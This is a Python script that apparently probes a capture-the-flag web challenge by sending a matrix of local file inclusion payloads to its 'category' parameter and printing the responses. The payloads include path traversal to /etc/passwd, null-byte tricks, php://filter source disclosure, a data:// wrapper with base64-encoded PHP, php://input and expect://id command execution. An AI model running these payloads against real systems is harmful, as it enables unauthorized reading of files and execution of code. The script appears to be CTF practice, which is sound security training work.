"""Probe a-bad-day (noctf port 40547) with a matrix of category payloads."""
import re
import urllib.parse
import urllib.request

BASE = "http://noctf.fa1lsnow.com:40547/index.php?category="

PAYLOADS = [
    "woofers",
    "meowers",
    "woofers/../meowers",
    "woofers/../flag",
    "woofers../../../../etc/passwd",
    "woofers../../../../etc/passwd%00",
    "....//....//....//....//etc/passwd",
    "/etc/passwd",
    "/flag.php",
    "flag",
    "flag.php",
    "php://filter",
    "php://filter/convert.base64-encode/resource=index.php",
    "php://filter/convert.base64-encode/resource=flag.php",
    "php://filter/convert.base64-encode/resource=index",
    "php://filter/read=convert.base64-encode/resource=flag.php",
    "data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+",
    "php://input",
    "expect://id",
    "index.php",
    "img/dog/9.jpg",
]


def fetch(cat):
    url = BASE + urllib.parse.quote(cat, safe="")
    req = urllib.request.Request(url, headers={"User-Agent": "probe"})
    try:
        with urllib.request.urlopen(req, timeout=8) as r:
            body = r.read().decode("utf-8", "replace")
            return r.status, body
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode("utf-8", "replace")
    except Exception as e:  # noqa: BLE001
        return "ERR", repr(e)


def section(body):
    if not isinstance(body, str):
        return ""
    m = re.search(r'<div class="page-include">(.*?)</div>', body, re.S)
    if not m:
        return ""
    txt = re.sub(r"\s+", " ", m.group(1)).strip()
    return txt[:220]


for p in PAYLOADS:
    status, body = fetch(p)
    print(f"[{status}] {p!r}")
    print("      section:", section(body))
    # also show whether body contains Sorry
    if isinstance(body, str) and "Sorry" in body:
        print("      (has 'Sorry' message)")
    if isinstance(body, str) and ("base64" in p or "PD9waHA" in p) and len(body) < 600:
        print("      BODY:", body[:400])
